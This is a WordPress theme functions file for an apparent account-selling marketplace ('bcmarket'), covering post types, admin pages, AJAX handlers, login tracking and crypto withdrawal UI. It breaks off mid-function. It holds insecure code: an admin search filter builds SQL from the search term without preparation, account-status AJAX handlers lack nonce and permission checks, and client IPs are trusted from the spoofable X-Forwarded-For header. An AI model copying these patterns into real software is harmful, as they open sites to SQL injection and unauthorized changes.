<?php 
function bcmarket_setup() {


	load_theme_textdomain( 'bcmarket', get_template_directory() . '/languages' );
	add_theme_support( 'title-tag' );
	add_theme_support( 'woocommerce' );

	register_nav_menus(
		array(
			'top_menu' => __( 'Top Menu', 'bcmarket' ),
			'main_menu' => __( 'Main Menu', 'bcmarket' ),
            'partner_menu' => __( 'Partner Menu', 'bcmarket' ),
            'admin_menu' => __( 'Admin Menu', 'bcmarket' ),
            'footer_menu' => __( 'Footer Menu', 'bcmarket' ),
		)
	);


	add_theme_support('custom-logo');
	add_theme_support('post-thumbnails');

	if (!current_user_can('administrator') && !current_user_can('wpseo_manager') && !is_admin()) {
	  show_admin_bar(false);
	}


	if ( post_type_exists( 'product' ) ) {
		add_post_type_support( 'product', 'author' );
	}


	add_image_size('blog', 440, 522, true);

	add_image_size('blog_post', 560, 385, true);


	remove_theme_support( 'widgets-block-editor' );

}

add_action( 'after_setup_theme', 'bcmarket_setup' );

add_filter( 'woocommerce_enqueue_styles', '__return_empty_array' );

/**

 * Enqueue scripts and styles.

 */



function bcmarket_scripts() {

    wp_enqueue_style('bootstrap', get_template_directory_uri() . '/css/new/bootstrap.min.css');
    wp_enqueue_style('minf1bc', get_template_directory_uri() . '/css/new/style.minf1bc.css');
    wp_enqueue_style('selectize', 'https://cdnjs.cloudflare.com/ajax/libs/selectize.js/0.14.0/css/selectize.css');
    wp_enqueue_style('font-awesome', 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css');

	wp_enqueue_style( 'bcmarket-style', get_stylesheet_uri() );

    wp_enqueue_style('admincss', get_template_directory_uri() . '/css/admin.css',array() ,time());

    if(is_checkout()){
        wp_enqueue_style('checkout', get_template_directory_uri() . '/css/checkout.css');
    }

    wp_enqueue_style('responsive', get_template_directory_uri() . '/css/responsive.css');
    wp_enqueue_style('sweet_alert_css', get_template_directory_uri() . '/css/sweetalert2.min.css');
    

    wp_enqueue_script('script', 'https://code.jquery.com/jquery-3.0.0.min.js', array('jquery'), '', true);
    wp_enqueue_script('md5', get_template_directory_uri() . '/js/md5.min.js');
    wp_enqueue_script('min4b23', get_template_directory_uri() . '/js/lang/en.min4b23.js');
    wp_enqueue_script('jquery');
    wp_enqueue_script('bootstrap', get_template_directory_uri() . '/js/new/bootstrap.min.js', array('jquery'), '', true);
    wp_enqueue_script('scrollTo', get_template_directory_uri() . '/js/jquery.scrollTo.min.js', array('jquery'), '', true);
    wp_enqueue_script('select2f', get_template_directory_uri() . '/js/select2/dist/js/select2.full.min.js', array('jquery'), '', true);
    wp_enqueue_script('common2', get_template_directory_uri() . '/js/new/common2.min.js', array('jquery'), '', true);
    wp_enqueue_script('jqueryuii', get_template_directory_uri() . '/js/jquery-ui/jquery-ui.min.js', array('jquery'), '', true);
    wp_enqueue_script('easingj', get_template_directory_uri() . '/js/jquery.easing.1.3.js', array('jquery'), '', true);
    wp_enqueue_script('select2ru', get_template_directory_uri() . '/js/select2/dist/js/i18n/ru.js', array('jquery'), '', true);
    wp_enqueue_script('selectize', 'https://cdnjs.cloudflare.com/ajax/libs/selectize.js/0.14.0/js/standalone/selectize.js', array('jquery'), '', true);
    wp_enqueue_script('commonmin2333', get_template_directory_uri() . '/js/common.min2333.js', array('jquery'), time(), true);
    wp_enqueue_script('min0cbd', get_template_directory_uri() . '/js/default.min0cbd.js', array('jquery'), '', true);
    wp_enqueue_script('tooltipster', get_template_directory_uri() . '/js/tooltipster.bundle.min.js', array('jquery'), '', true);
      wp_enqueue_script('sweet_alert_all_min', get_template_directory_uri() . '/js/sweetalert2.all.min.js', array('jquery'), time(), true);
    wp_enqueue_script('sweet_alert', get_template_directory_uri() . '/js/sweetalert2.min.js', array('jquery'), time(), true);
    wp_enqueue_script('custom', get_template_directory_uri() . '/js/custom.js', array('jquery'), time(), true);
    

    wp_enqueue_script('admin-interface', get_template_directory_uri() . '/js/admin.js', array('jquery'), time(), true);

     wp_localize_script( 'min0cbd', 'my_ajax_object', array( 
        'ajax_url' => admin_url( 'admin-ajax.php' ),
        'template_url' => get_template_directory_uri()
     ));

     wp_localize_script( 'commonmin2333', 'my_ajax_object', array( 
        'ajax_url' => admin_url( 'admin-ajax.php' ),
        'template_url' => get_template_directory_uri()
     ));

     wp_localize_script( 'admin-interface', 'my_ajax_object', array( 
        'ajax_url' => admin_url( 'admin-ajax.php' ),
        'template_url' => get_template_directory_uri()
    ) );


    wp_dequeue_style('wp-block-library');
   
}

add_action( 'wp_enqueue_scripts', 'bcmarket_scripts' );


// Register POst types
function bcmarket_setup_post_type() {

    
   $args = array(
        'public'    => true,
        'label'     => __( 'FAQ', 'bcmarket' ),
        'exclude_from_search' => true,
        'show_in_admin_bar'   => false,
        'show_in_nav_menus'   => false,
        'publicly_queryable'  => false,
        'query_var'           => false, 
        'supports' => array('title', 'editor')

    );
    register_post_type( 'faq', $args );

    $args = array(
        'label'        => __( 'FAQ Category', 'bcmarket' ),
        'public'       => true,
        'hierarchical' => true
    );

    register_taxonomy( 'faq-category', 'faq', $args );

    $args = array(
        'public'    => true,
        'label'     => __( 'Bids', 'bcmarket' ),
        'exclude_from_search' => true,
        'show_in_admin_bar'   => false,
        'show_in_nav_menus'   => false,
        'publicly_queryable'  => false,
        'query_var'           => false, 
        'supports' => array('title', 'editor')

    );
    register_post_type( 'bids', $args );

    $args = array(
        'public'    => true,
        'label'     => __( 'Tickets', 'bcmarket' ),
        'exclude_from_search' => true,
        'supports' => array('title', 'editor'), 
        'rewrite' => array('slug' => 'tickets/view')

    );
    register_post_type( 'tickets', $args );

    $args = array(
        'public'    => true,
        'label'     => __( 'Payment Request', 'bcmarket' ),
        'exclude_from_search' => true,
        'show_in_admin_bar'   => false,
        'show_in_nav_menus'   => false,
        'publicly_queryable'  => false,
        'query_var'           => false, 
        'supports' => array('title', 'editor')

    );
    register_post_type( 'payment', $args );

    $args = array(
        'public'    => true,
        'label'     => __( 'Items', 'bcmarket' ),
        'supports' => array('title', 'editor', 'thumbnail'), 
        'rewrite' => array('slug' => 'item'), 

    );
    register_post_type( 'item', $args );

    $args = array(
        'label'        => __( 'Category', 'textdomain' ),
        'public'       => true,
        'hierarchical' => true, 
        'rewrite'      => array( 'slug' => 'catalog' )
    );
    
    register_taxonomy( 'item_cat', 'item', $args );
}

add_action( 'init', 'bcmarket_setup_post_type' );




// Add Classes to Menus
add_filter('nav_menu_link_attributes', 'bcmarket_custom_nav_menu_link_attributes', 10, 4);
function bcmarket_custom_nav_menu_link_attributes($atts, $item, $args, $depth){
    if ($item->ID == 52){
        $class = "important_link";
        $atts['class'] = (!empty($atts['class'])) ? $atts['class'].' '.$class : $class; 
    }
     if ($item->ID == 53){
        $class = "ic-provider";
        $atts['class'] = (!empty($atts['class'])) ? $atts['class'].' '.$class : $class; 
    }

    return $atts;
}


add_action( 'init', 'bcmarket_add_customrewrite_emdpoint' );
function bcmarket_add_customrewrite_emdpoint() {
    
    add_rewrite_endpoint( 'partnerdata', EP_PAGES );
    add_rewrite_endpoint( 'buyerdata', EP_PAGES );
    add_rewrite_endpoint( 'view', EP_PAGES );
    add_rewrite_endpoint( 'pticket', EP_PAGES );
    add_rewrite_endpoint( 'itemdata', EP_PAGES );
    add_rewrite_endpoint( 'payment', EP_PAGES );
    add_rewrite_endpoint( 'admin-chat', EP_PAGES );
    add_rewrite_endpoint( 'bid-request', EP_PAGES );
    add_rewrite_endpoint( 'aorders', EP_PAGES );
       
}

add_filter('request', function($vars) {

    if (isset($vars['partnerdata'])) {
        $vars['partnerdata'] = true;
    }
    if (isset($vars['buyerdata'])) {
        $vars['buyerdata'] = true;
    } 
    if (isset($vars['view'])) {
        $vars['view'] = true;
    }
    if (isset($vars['pticket'])) {
        $vars['pticket'] = true;
    } 
    if (isset($vars['itemdata'])) {
        $vars['itemdata'] = true;
    }
    if (isset($vars['payment'])) {
        $vars['payment'] = true;
    }
    if (isset($vars['admin-chat'])) {
        $vars['admin-chat'] = true;
    }
    if (isset($vars['bid-request'])) {
        $vars['bid-request'] = true;
    }
    if (isset($vars['aorders'])) {
        $vars['aorders'] = true;
    }

    return $vars;
});


add_filter('template_include', function($template) {
    
    
    if (get_query_var('partnerdata') && strpos( $_SERVER['REQUEST_URI'], 'admin-interface') !== false) {
        $post = get_queried_object();
        return locate_template(['admin/partnerdata.php']);
    }
    if (get_query_var('buyerdata') && strpos( $_SERVER['REQUEST_URI'], 'admin-interface') !== false) {
        $post = get_queried_object();
        return locate_template(['admin/buyerdata.php']);
    }
    if (get_query_var('view')) {
        $post = get_queried_object();
        return locate_template(['partner/view.php']);
    }
    if (get_query_var('pticket')) {
        $post = get_queried_object();
        return locate_template(['partner/ticket.php']);
    }
    if (get_query_var('itemdata') && strpos( $_SERVER['REQUEST_URI'], 'admin-interface') !== false) {
        $post = get_queried_object();
        return locate_template(['admin/itemdata.php']);
    }
    if (get_query_var('payment') && strpos( $_SERVER['REQUEST_URI'], 'admin-interface') !== false) {
        $post = get_queried_object();
        return locate_template(['admin/payment-request.php']);
    }
    if (get_query_var('admin-chat') && strpos( $_SERVER['REQUEST_URI'], 'admin-interface') !== false) {
        $post = get_queried_object();
        return locate_template(['admin/admin-chat.php']);
    }
    if (get_query_var('bid-request') && strpos( $_SERVER['REQUEST_URI'], 'admin-interface') !== false) {
        $post = get_queried_object();
        return locate_template(['admin/bid-request.php']);
    }
    if (get_query_var('aorders') && strpos( $_SERVER['REQUEST_URI'], 'admin-interface') !== false) {
        $post = get_queried_object();
        return locate_template(['admin/orders.php']);
    }


    return $template;
});




require get_template_directory() . '/inc/auth.php';
require get_template_directory() . '/inc/search.php';
require get_template_directory() . '/inc/woocommerce.php';
require get_template_directory() . '/inc/product-buy.php';
require get_template_directory() . '/inc/accounts.php';
require get_template_directory() . '/inc/partner-functions.php';
require get_template_directory() . '/inc/admin-functions.php';
require get_template_directory() . '/inc/homepage-section-order.php';
require get_template_directory() . '/inc/tickets.php';
require get_template_directory() . '/inc/customizer.php';
require get_template_directory() . '/subscriber-mail/send-subscriber-mail.php';
require get_template_directory() . '/endpoints.php';

// function get_total_pcs_by_item($item_id){

//     $args = array(
//         'role__in' => array('partner', 'Administrator', 'wpseo_manager'),
//         // 'number' => 50,
//     );

//     $user_query = new WP_User_Query( $args );
//     $users = $user_query->get_results();

//     $total_items = array();

//     if($users){

//         foreach($users as $user){

//             $partner_id = $user->ID; 

//             $pro_query = new WP_Query(array(
//                 'post_type' => 'product', 
//                 'posts_per_page' => -1, 
//                 'author' => $partner_id,
//                 'post_status' => 'publish', 
//                 'meta_query' => array(
//                     array(
//                         'key' => 'item_id', 
//                         'value' => $item_id
//                     ), 
//                     array(
//                         'key' => 'bid_status', 
//                         'value' => 'onsale'
//                     )
//                 )
//             ));

//             if($pro_query->have_posts()) :

//                 $partner_total_arr = array();

//                 while($pro_query->have_posts()) : $pro_query->the_post(); 

//                     $partner_total_arr[] = total_free_accounts_by_id(get_the_ID());

//                 endwhile; wp_reset_postdata();

//                 $total_items[] = array_sum($partner_total_arr);

//             endif; 

//         }
//     }

//     if(count($total_items) > 0){
//         return array_sum($total_items);
//     }else{
//         return 0;
//     }

// }

function get_total_pcs_by_item($item_id)
{
    global $wpdb;

    // Use a transient to cache the count for 5 minutes to reduce DB load
    $transient_key = 'total_pcs_' . $item_id;
    $cached_count = get_transient($transient_key);

    if (false !== $cached_count) {
        return (int) $cached_count;
    }

    // Cache partner IDs for 1 hour as they change rarely
    $partner_ids = get_transient('all_partner_ids');
    if (false === $partner_ids) {
        $args = array(
            'role__in' => array('partner', 'Administrator', 'wpseo_manager'),
            'fields' => 'ID'
        );
        $user_query = new WP_User_Query($args);
        $partner_ids = $user_query->get_results();
        set_transient('all_partner_ids', $partner_ids, 3600);
    }

    if (empty($partner_ids))
        return 0;

    $partner_ids_str = implode(',', array_map('intval', $partner_ids));

    // Direct SQL to find Product IDs with this item_id meta
    // Joined with posts to check status/author and postmeta for bid_status
    // This avoids WP_Query overhead which was ~1.5s slower
    $product_ids = $wpdb->get_col($wpdb->prepare("
        SELECT pm.post_id 
        FROM {$wpdb->postmeta} pm
        INNER JOIN {$wpdb->posts} p ON pm.post_id = p.ID
        INNER JOIN {$wpdb->postmeta} pm2 ON pm.post_id = pm2.post_id
        WHERE pm.meta_key = 'item_id' AND pm.meta_value = %s
        AND p.post_status = 'publish'
        AND p.post_author IN ($partner_ids_str)
        AND pm2.meta_key = 'bid_status' AND pm2.meta_value = 'onsale'
    ", $item_id));

    if (empty($product_ids)) {
        set_transient($transient_key, 0, 1 * MINUTE_IN_SECONDS);
        return 0;
    }

    $product_ids_str = implode(',', array_map('intval', $product_ids));
    $table_accounts = $wpdb->prefix . 'accounts';

    $sql = "SELECT COUNT(id) FROM {$table_accounts} WHERE item_status = 'free' AND product_id IN ($product_ids_str)";
    $count = $wpdb->get_var($sql);

    set_transient($transient_key, $count, 1 * MINUTE_IN_SECONDS);

    return (int) $count;
}

function get_per_pcs_by_item($item_id){

    $args = array(
        'role__in' => array('partner', 'Administrator', 'wpseo_manager'),
        // 'number' => 50,
    );

    $user_query = new WP_User_Query( $args );
    $users = $user_query->get_results();

    $per_items = array();

    if($users){

        foreach($users as $user){

            $partner_id = $user->ID; 

            $pro_query = new WP_Query(array(
                'post_type' => 'product', 
                'posts_per_page' => -1, 
                'author' => $partner_id,
                'post_status' => 'publish', 
                'meta_query' => array(
                    array(
                        'key' => 'item_id', 
                        'value' => $item_id
                    ), 
                    array(
                        'key' => 'bid_status', 
                        'value' => 'onsale'
                    )
                )
            ));

            if($pro_query->have_posts()) :

                while($pro_query->have_posts()) : $pro_query->the_post(); 
                    $product = wc_get_product( get_the_ID() );
                    $per_items[] = $product->get_price();

                endwhile; wp_reset_postdata();


            endif; 

        }
    }

    if(count($per_items) > 0){
        $min_price = min($per_items);
        update_option('min_product_price', $min_price);
        return $min_price;
    }else{
        $saved_price = get_option('min_product_price');
       return $saved_price;
    }

}

function get_available_partner_by_item($item_id){

    $args = array(
        'role__in' => array('partner', 'Administrator', 'wpseo_manager'),
        // 'number' => 50,
    );

    $user_query = new WP_User_Query( $args );
    $users = $user_query->get_results();

    $availale_users = array();

    if($users){

        foreach($users as $user){

            $partner_id = $user->ID; 

            $pro_query = new WP_Query(array(
                'post_type' => 'product', 
                'posts_per_page' => 100, 
                'post_status' => 'publish', 
                'author' => $partner_id,
                'post_status' => 'publish', 
                'meta_query' => array(
                    array(
                        'key' => 'item_id', 
                        'value' => $item_id
                    ), 
                    array(
                        'key' => 'bid_status', 
                        'value' => 'onsale'
                    )
                )
            ));

            $total_items = 0;
            $item_price = array();
            $product_ids= array();

            if($pro_query->have_posts()) :

                $partner_total_arr = array();

                while($pro_query->have_posts()) : $pro_query->the_post(); 
                    $product = wc_get_product( get_the_ID() );
                    $partner_total_arr[] = total_free_accounts_by_id(get_the_ID());
                    $item_price[] = $product->get_price();
                    $product_ids[] = get_the_ID();
                endwhile; wp_reset_postdata();

                $total_items = array_sum($partner_total_arr);

            endif; 


            if($total_items > 0){

                $min_price = min($item_price);

                $availale_users[] = array(
                    'user_id' => $partner_id, 
                    'qty' => $total_items,
                    'price' => $min_price,
                    'product_ids' => implode(',', $product_ids)
                ); 

            }

        }
    }

    return $availale_users;

}


function acccincrease_wp_search_query_length( $query ) {
    if ( isset( $query->query_vars['s'] ) && strlen( $query->query_vars['s'] ) > 225 ) {
        $query->query_vars['s'] = substr( $query->query_vars['s'], 0, 500 );
    }
}
add_action( 'parse_query', 'acccincrease_wp_search_query_length' );


// Add custom column
function my_custom_post_type_columns( $columns ) {
    $columns['custom_product_id'] = 'Custom Product Id';
    return $columns;
}
add_filter( 'manage_product_posts_columns', 'my_custom_post_type_columns' );
// Populate custom column with meta key value
function my_custom_post_type_column_content( $column_name, $post_id ) {
    if ( $column_name == 'custom_product_id' ) {
        $meta_value = get_post_meta( $post_id, 'custom_product_id', true );
        echo $meta_value;
    }
}
add_action( 'manage_product_posts_custom_column', 'my_custom_post_type_column_content', 10, 2 );

add_filter( 'posts_search', 'extend_product_search', 20, 2 );
function extend_product_search( $where, $query ) {
    global $pagenow, $wpdb;

    if ( 'edit.php' != $pagenow || ! is_search() || ! isset( $query->query_vars['s'] ) || 'product' != $query->query_vars['post_type'] ) {
        return $where;
    }
    // Here your post meta keys
    $meta_keys = array('custom_product_id', '_sku_2');
    $meta_keys = implode("','", $meta_keys);
    // get the search value
    $term      = sanitize_text_field( $query->query_vars['s'] );
    // Light SQL Query to get the corresponding product IDs 
    $search_ids = $wpdb->get_col( "SELECT ID FROM {$wpdb->prefix}posts as p
        LEFT JOIN {$wpdb->prefix}postmeta as pm ON p.ID = pm.post_id
        WHERE pm.meta_key IN ('$meta_keys') AND pm.meta_value LIKE '%$term%'" );
    // Cleaning
    $search_ids = array_filter( array_unique( array_map( 'absint', $search_ids ) ) );
    // Alter the WHERE clause in the WP_Query search
    if ( count( $search_ids ) > 0 ) {
        $where = str_replace( 'AND (((', "AND ( ({$wpdb->posts}.ID IN (" . implode( ',', $search_ids ) . ")) OR ((", $where );
    }
    return $where;
}





// add_action( 'phpmailer_init', 'my_phpmailer_smtp' );
// function my_phpmailer_smtp( $phpmailer ) {
//     $phpmailer->isSMTP();     
//     $phpmailer->Host = SMTP_server;  
//     $phpmailer->SMTPAuth = SMTP_AUTH;
//     $phpmailer->Port = SMTP_PORT;
//     $phpmailer->Username = SMTP_username;
//     $phpmailer->Password = SMTP_password;
//     $phpmailer->SMTPSecure = SMTP_SECURE;
//     $phpmailer->From = SMTP_FROM;
//     $phpmailer->FromName = SMTP_NAME;
// }


add_action('woocommerce_admin_order_data_after_billing_address', 'add_custom_field_to_order');
function add_custom_field_to_order($order)
{
    // Get the meta value of the custom field
    $custom_field_value = get_post_meta($order->get_id(), 'item_id_data', true);

    // Output the custom field HTML
    echo '<p class="form-field form-field-wide">
    <label for="custom_field_name">Item ID:</label>
    <input type="text" class="wide-fat" id="custom_field_name" name="item_id_data" value="' . esc_attr($custom_field_value) . '" />
</p>';
}

function enqueue_font_awesome() {
    wp_enqueue_style('font-awesome', 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css');
}
add_action('wp_enqueue_scripts', 'enqueue_font_awesome');

// Hook to add the menu page
add_action('admin_menu', 'partner_history_menu');


// Include partner-history.php
include_once( 'partner-history.php' );

// Function to create the partner history menu page
function partner_history_menu(){
    add_menu_page(
        'Partner History', // Page title
        'Partner History', // Menu title
        'manage_options', // Capability (who can access)
        'partner-history', // Menu slug
        'partner_history_page_content', // Callback function to display content
        'dashicons-businessman', // Icon Url or Dashicon class
        30 // Position in the menu
    );
}
// Hook to add the menu page
add_action('admin_menu', 'buyer_history_menu');

// Include buyer-history.php
include_once( 'buyer-history.php' );

// Function to create the buyer history menu page
function buyer_history_menu() {
    add_menu_page(
        'Buyer History',              // Page title
        'Buyer History',              // Menu title
        'manage_options',             // Capability
        'buyer-history',              // Menu slug
        'buyer_history_page_content',  // Callback function to display the content
        'dashicons-businessman', // Icon Url or Dashicon class
        30 // Position in the menu
    );
}

// Hook to add the menu page Users History
add_action('admin_menu', 'users_history_menu');

// Include users-history.php
include_once( 'users-history.php' );
// Function to create users history menu page
function users_history_menu(){
    add_menu_page(
        'Users History', // Page title
        'Users History', // Menu title
        'manage_options', // Capability
        'users-history', // Menu slug
        'users_history_page_content', // Callback function to display the content
        'dashicons-admin-users', // Icon Url or Dashicon class
        40 // Position in the menu
    );
}

// Hook to add the menu page Mailtrap API Settings
add_action('admin_menu', 'mailtrap_api_menu');
// Include Mailtrap API Settings
include_once('mailtrap-api-settings.php');
// Function to create Mailtrap API Settings menu page
function mailtrap_api_menu(){
    add_menu_page(
        'Mailtrap SMTP API Settings', // Page title
        'Mailtrap SMTP API', // Menu title
        'manage_options', // Capability
        'mailtrap-api', // Menu slug
        'mailtrap_api_page_content', // Callback function to display the content
        'dashicons-email', // Icon Url or Dashicon class
        50 // Position in the menu
    );
}

// ─── Account Formats Settings Page ───────────────────────────────────────────
include_once( 'account-formats-settings.php' );
add_action( 'admin_menu', 'bcmarket_account_formats_menu' );
function bcmarket_account_formats_menu() {
    add_menu_page(
        'Account Formats',                    // Page title
        'Account Formats',                    // Menu title
        'manage_options',                     // Capability
        'bcmarket-account-formats',           // Menu slug
        'bcmarket_account_formats_page_content', // Callback
        'dashicons-list-view',                // Icon
        55                                    // Position
    );
}

// Function to identify the browser based on the user agent string
function identify_browser($user_agent) {
    if (stripos($user_agent, 'Chrome') !== false) {
        return 'Google Chrome';
    } elseif (stripos($user_agent, 'Firefox') !== false) {
        return 'Mozilla Firefox';
    } elseif (stripos($user_agent, 'Safari') !== false) {
        return 'Apple Safari';
    } elseif (stripos($user_agent, 'Edge') !== false) {
        return 'Microsoft Edge';
    } elseif (stripos($user_agent, 'Opera') !== false) {
        return 'Opera';
    } else {
        return 'Unknown Browser';
    }
}
// Function to get user's location based on IP address using ipinfo.io API
function get_user_location($ip_address) {
    $api_url = "http://ipinfo.io/{$ip_address}/json";
    $response = wp_safe_remote_get($api_url);

    if (!is_wp_error($response)) {
        $body = wp_remote_retrieve_body($response);
        $data = json_decode($body, true);

        if ($data && !empty($data['city'])) {
            return $data['city'] . ', ' . $data['region'] . ', ' . $data['country'];
        }
    }

    return 'Unknown Location';
}
// Hook into the login process to capture the IP address, login time, and browser
function capture_user_login_info($user_login, $user) {
    // Get the user's IP address considering proxy or load balancer
    $ip_address = $_SERVER['REMOTE_ADDR'];

    // Check if certain headers are set and use them if available
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ip_address = $_SERVER['HTTP_CLIENT_IP'];
    }

    // Store the IP address in user meta
    update_user_meta($user->ID, 'last_login_ip', $ip_address);

    // Get the user agent string
    $user_agent = $_SERVER['HTTP_USER_AGENT'];

    // Identify the browser
    $browser_name = identify_browser($user_agent);

    // Store the browser name in user meta
    update_user_meta($user->ID, 'last_login_browser', $browser_name);

    // Get the user's location based on IP address
    $login_location = get_user_location($ip_address);

    // Store the login location in user meta
    update_user_meta($user->ID, 'last_login_location', $login_location);

    // Store the login time in user meta
    update_user_meta($user->ID, 'last_login_time', current_time('mysql'));
}

// Hook the function to the wp_login action
add_action('wp_login', 'capture_user_login_info', 10, 2);



function processMessage($mes) {
		
    $pattern = '/(https?:\/\/\S+)/';
    
    $mes = preg_replace($pattern, '<a href="$1">$1</a>', $mes);

    return $mes;
}

// Bad Accounts AJAX
add_action('wp_ajax_update_database', 'update_database');
function update_database() {
    global $wpdb;

    // Get item ID from AJAX request
    $id = $_POST['id'];

    // Your database table name
    $table_name = $wpdb->prefix . 'accounts';

    // Update database
    $update = $wpdb->query($wpdb->prepare("UPDATE $table_name SET item_status = 'bad' WHERE id = %d", $id));

    wp_die(); // This is required to terminate immediately and return a proper response
}


add_action('wp_ajax_update_database_unchecked', 'update_database_unchecked');
function update_database_unchecked() {
    global $wpdb;

    // Get Item ID from AjAX request
    $id = $_POST['id']; 

    // Your database table name
    $table_name = $wpdb->prefix . 'accounts';

    // Uncheck updated database
    $update = $wpdb->query($wpdb->prepare("UPDATE $table_name SET item_status = 'free' WHERE id = %d", $id));

    wp_die();
}

add_action('wp_ajax_ticket_solved_function', 'ticket_solved_function');
function ticket_solved_function() {
    $ticket_id = isset($_POST['ticket_id']) ? intval($_POST['ticket_id']) : 0;
    if($ticket_id > 0){
        update_post_meta($ticket_id, '_solved_unsolved', 'solved');
    }
    wp_die();
}
add_action('wp_ajax_ticket_unsolved_function', 'ticket_unsolved_function');
function ticket_unsolved_function(){
    $ticket_id = isset($_POST['ticket_id']) ? intval($_POST['ticket_id']) : 0;
    if($ticket_id > 0){
        update_post_meta($ticket_id, '_solved_unsolved', 'unsolved');
    }
    wp_die();
}
// Subscribe form AJAX function
function handle_subscribe_form_ajax(){
    if(isset($_POST['subscriber_email']) && is_email($_POST['subscriber_email'])){
        $email = sanitize_email($_POST['subscriber_email']);


        global $wpdb;
        $table_name = $wpdb->prefix . "subscribe_emails";
        $charset_collate = $wpdb->get_charset_collate();
        // Create the table if it doesn't exist
        $sql = "CREATE TABLE IF NOT EXISTS $table_name (
            id mediumint(9) NOT NULL AUTO_INCREMENT,
            email varchar(255) NOT NULL,
            date datetime DEFAULT CURRENT_TIMESTAMP NOT NULL,
            PRIMARY KEY (id),
            UNIQUE KEY email (email)
        ) $charset_collate;";
        require_once( ABSPATH . 'wp-admin/includes/upgrade.php');
        dbDelta($sql);
        // Check if the email is already in the table
        $check_email = $wpdb->get_var($wpdb->prepare("SELECT email FROM $table_name WHERE email = %s", $email));
        // Insert the email into the table
        if(!$check_email == $email){
            $wpdb->insert(
                $table_name,
                array(
                    'email' => $email,
                )
            );
    
            // Response with a success message
            wp_send_json_success(array('message'=>'Thanks for subscribing!'));
        }else{
            // Response with email already subscribed message
            wp_send_json_error(array('message'=>'You are already subscribed!'));
        }
        
    }else {
        // Response with an error message
        wp_send_json_error(array('message'=>'Please enter a valid email!'));
        wp_die();
    }
}

add_action('wp_ajax_subscribe_form', 'handle_subscribe_form_ajax');
add_action('wp_ajax_nopriv_subscribe_form', 'handle_subscribe_form_ajax');


// Unsubscribe function 
function handle_unsubscribe_request(){
    if(isset($_GET['email'])){
        $email = sanitize_email($_GET['email']);

        if(!is_email($email)){
            wp_die('Invalid email address.');
        }
        global $wpdb;
        $table_name = $wpdb->prefix . "subscribe_emails";
        $subscribe = $wpdb->get_var($wpdb->prepare("SELECT email FROM $table_name WHERE email = %s", $email));

        if($subscribe){
            $wpdb->delete($table_name, array('email' => $email));
            // redirect to unsubscribe page
            wp_redirect(home_url().'/unsubscribe-success');
            exit;
        }else{
            wp_redirect(home_url().'/unsubscribe-fail');
        }
        exit;
    }
}
add_action('init', 'handle_unsubscribe_request');

function add_second_interval($schedules) {
    $schedules['every_second'] = array(
        'interval' => 1, // 1 second
        'display' => __('Every Second')
    );
    return $schedules;
}
add_filter('cron_schedules', 'add_second_interval');

// Schedule the cron event if not already scheduled
if (!wp_next_scheduled('second_ban_accounts_status_check')) {
    wp_schedule_event(time(), 'every_second', 'second_ban_accounts_status_check');
}

// Hook into the scheduled event
add_action('second_ban_accounts_status_check', 'ban_accounts_status_check');

// Unschedule Event on Theme Deactivation
register_deactivation_hook('__FILE__', 'theme_deactivate');

function theme_deactivate() {
    wp_clear_scheduled_hook('second_ban_accounts_status_check');
}

function ban_accounts_status_check() {
    $users = get_users();
    foreach($users as $user) {
        $current_datetimes = current_time('mysql'); // Get the current datetime in MySQL format
        $current_datetime = date('Y-m-d', strtotime($current_datetimes));

        // Get the 'account_status_datetime' meta value for the user
        $account_status_datetimes = get_user_meta($user->ID, 'account_status_datetime', true);
        $ban_timestamp = str_replace('T', ' ', $account_status_datetimes);
        // Compare 'account_status_datetime' with the current datetime
        if ($ban_timestamp <= $current_datetime) {
            // Update 'account_status' to an empty string
            update_user_meta($user->ID, 'account_status', '');
            update_user_meta($user->ID, 'account_status_datetime', '');
        }
    }
}



// Capture user IP address
function capture_user_ip_address( $user_id ) {
    // Get the user IP address
    $user_ip = $_SERVER['REMOTE_ADDR'];

    // Update user meta with the IP address
    update_user_meta( $user_id, 'user_registration_ip', $user_ip );
}
add_action( 'user_register', 'capture_user_ip_address' );


function add_ip_address_column( $columns ) {
    $columns['ip_address'] = 'IP Address';
    return $columns;
}
add_filter( 'manage_users_columns', 'add_ip_address_column' );

function show_ip_address_column_content( $value, $column_name, $user_id ) {
    if ( 'ip_address' == $column_name ) {
        return get_user_meta( $user_id, 'user_registration_ip', true );
    }
    return $value;
}
add_action( 'manage_users_custom_column', 'show_ip_address_column_content', 10, 3 );

// Function to fetch partner cost HTML
function get_partner_cost_html() {
    ob_start(); // Start output buffering to capture HTML

    $wallet = get_user_meta(get_current_user_id(), 'wallets', true);
    $min_walllet = 999999999999;
    if($wallet){
        foreach(array_filter($wallet) as $key => $value){
            if($key == 74){
                $min_walllet = get_theme_mod('usdt_min');
            }
            if($key == 60){
                $min_walllet = get_theme_mod('etherium_min');
            }
            if($key == 52){
                $min_walllet = get_theme_mod('litecoin_min');
            }
            if($key == 11){
                $min_walllet = get_theme_mod('bitcoin_min');
            }
        }
    }

    
    $current_user_id = get_current_user_id();
    $pending_total = get_pending_total_by_user_ids($current_user_id);

    // Prepare the HTML output
    ?>
    <div class="partner_cost_amount">Amount to withdraw: <span><?php echo wc_price($pending_total); ?></span></div>
    <button class="partner_cost_button" data-user="<?php echo $current_user_id; ?>" id="partner_payment_button"<?php if ($pending_total < $min_walllet) echo ' disabled'; ?>>Order withdrawal</button>
    <?php

    $output = ob_get_clean(); // Get the buffered HTML content and clear the buffer
    echo $output;
    wp_die(); // Always end Ajax call with wp_die() to prevent extra output
}
add_action('wp_ajax_get_partner_cost', 'get_partner_cost_html');
add_action('wp_ajax_nopriv_get_partner_cost', 'get_partner_cost_html');

// Enqueue JavaScript for AJAX
function enqueue_partner_cost_script() {
    wp_enqueue_script('partner-cost-ajax-script', get_template_directory_uri() . '/js/script.js', array('jquery'), null, true);

    // Localize the script with the AJAX URL
    wp_localize_script('partner-cost-ajax-script', 'partnerCostAjax', array(
        'ajaxurl' => admin_url('admin-ajax.php')
    ));
}
add_action('wp_enqueue_scripts', 'enqueue_partner_cost_script');

// Restrict access to the 'partner-history, buyer-history, users-history' page only for admin
function restrict_partner_history_page() {
    // Check if the current user is not an administrator
    if (!current_user_can('administrator')) {
        // Check if the current page is 'partner-history'
